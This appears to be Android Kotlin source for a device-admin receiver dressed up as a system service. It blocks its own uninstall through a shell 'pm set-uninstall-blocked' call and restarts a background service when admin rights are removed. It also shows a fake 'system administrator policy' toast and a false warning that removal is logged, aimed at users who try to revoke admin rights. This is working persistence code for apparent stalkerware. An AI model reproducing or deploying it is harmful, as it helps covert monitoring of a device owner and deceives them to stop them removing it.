package com.system.service.core

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class DeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        // Admin activated — block uninstall via Shizuku if available
        tryBlockUninstall(context)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        // Admin removed — immediately restart service and re-request
        try {
            context.startForegroundService(Intent(context, CoreService::class.java))
        } catch (_: Exception) {}
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Show warning when someone tries to remove admin — this delays removal
        Toast.makeText(context, "System administrator policy prevents this action.", Toast.LENGTH_LONG).show()
        return "Removing device administrator will disable system protection and monitoring services. This action is logged."
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {}
    override fun onPasswordSucceeded(context: Context, intent: Intent) {}

    private fun tryBlockUninstall(context: Context) {
        try {
            val pkg = context.packageName
            // Try via Shizuku/shell if available
            Runtime.getRuntime().exec(arrayOf(
                "pm", "set-uninstall-blocked", pkg, "true"
            )).waitFor()
        } catch (_: Exception) {}
    }
}
